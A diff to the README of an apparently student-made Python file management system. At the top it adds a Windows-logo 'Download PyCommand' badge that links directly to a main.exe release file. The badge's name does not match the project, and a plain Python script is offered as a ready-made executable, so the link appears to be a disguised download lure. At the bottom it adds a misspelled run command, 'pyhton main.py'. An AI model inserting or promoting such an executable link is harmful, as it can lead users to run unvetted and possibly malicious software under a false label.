@@ -1,3 +1,5 @@
+""Download PyCommand" (https://img.shields.io/badge/Download-PyCommand-blue?style=for-the-badge&logo=windows)" (https://github.com/saniya2006-hub/File-Management-system/releases/latest/download/main.exe)
+
 # 📁 File Management System
 
 A simple and interactive **File Management System** developed using Python. This project provides a menu-driven command-line interface to manage files and folders easily.
@@ -94,3 +96,6 @@ Through this project, I gained practical experience in:
 GitHub: [Saniya2006-hub](https://github.com/Saniya2006-hub)
 
 ---
+'''bash
+pyhton main.py
+'''
